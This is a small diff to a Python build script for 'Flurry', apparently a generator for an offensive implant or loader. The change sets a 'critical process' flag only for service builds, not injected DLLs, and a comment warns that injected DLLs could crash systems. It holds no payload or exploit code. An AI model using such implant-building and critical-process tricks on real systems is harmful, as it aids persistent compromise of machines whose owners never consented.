@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-# Copyright (C) 2021 - 2022 iDigitalFlame
+# Copyright (C) 2020 - 2022 iDigitalFlame
 #
 # This program is free software: you can redistribute it and/or modify
 # it under the terms of the GNU General Public License as published by
@@ -199,7 +199,12 @@ class Flurry(object):
             guard=go_bytes(g),
             files_key=go_bytes(d),
             service=f'"{cfg["service_name"]}"',
-            critical="true" if cfg["critical"] else "false",
+            critical="true"
+            if cfg["critical"] and not workspace["library"] and cfg["service"]
+            else "false",
+            # BUG(dij): Let's NOT set DLL files as critical for now. We can't
+            #           control how they /exactly/ handle injection so we don't
+            #           want to leave systems crashing.
         )
         del k, e, p, g, t
         p = join(base, "flurry.go")
